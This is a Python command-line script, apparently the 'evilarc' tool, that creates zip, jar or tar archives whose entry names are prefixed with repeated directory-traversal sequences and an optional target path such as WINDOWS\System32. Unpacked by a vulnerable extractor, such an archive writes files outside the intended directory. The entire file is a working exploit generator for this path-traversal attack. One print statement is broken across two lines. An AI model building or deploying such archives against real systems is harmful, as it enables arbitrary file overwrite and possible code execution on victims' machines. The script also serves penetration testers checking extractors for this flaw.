#!/usr/bin/env python
# encoding: utf-8


import optparse
import os
import sys
import tarfile
import zipfile


def main(argv=sys.argv):
    p = optparse.OptionParser(description='Create archive containing a file with directory traversal',
                              prog='evilarc',
                              version='0.1',
                              usage='%prog <input file>')
    p.add_option('--output-file', '-f', dest="out",
                 help="File to output archive to.  Archive type is based off of file extension.  Supported extensions are zip, jar, tar, tar.bz2, tar.gz, and tgz.  Defaults to evil.zip.")
    p.set_default("out", "evil.zip")
    p.add_option('--depth', '-d', type="int", dest="depth", help="Number directories to traverse. Defaults to 8.")
    p.set_default("depth", 8)
    p.add_option('--os', '-o', dest="platform", help="OS platform for archive (win|unix). Defaults to win.")
    p.set_default("platform", "win")
    p.add_option('--path', '-p', dest="path",
                 help="Path to include in filename after traversal.  Ex: WINDOWS\\System32\\")
    p.set_default("path", "")
    options, arguments = p.parse_args()

    if len(arguments) != 1:
        p.error("Incorrect arguments")

    fname = arguments[0]
    if not os.path.exists(fname):
        sys.exit("Invalid input file")

    if options.platform == "win":
        dir = "..\\"
        if options.path and options.path[-1] != '\\':
            options.path += '\\'
    else:
        dir = "../"
        if options.path and options.path[-1] != '/':
            options.path += '/'

    zpath = dir * options.depth + options.path + os.path.basename(fname)
    print
    "Creating " + options.out + " containing " + zpath;
    ext = os.path.splitext(options.out)[1]
    if os.path.exists(options.out):
        wmode = 'a'
    else:
        wmode = 'w'
    if ext == ".zip" or ext == ".jar":
        zf = zipfile.ZipFile(options.out, wmode)
        zf.write(fname, zpath)
        zf.close()
        return
    elif ext == ".tar":
        mode = wmode
    elif ext == ".gz" or ext == ".tgz":
        mode = "w:gz"
    elif ext == ".bz2":
        mode = "w:bz2"
    else:
        sys.exit("Could not identify output archive format for " + ext)

    tf = tarfile.open(options.out, mode)
    tf.add(fname, zpath)
    tf.close()


if __name__ == '__main__':
    main()
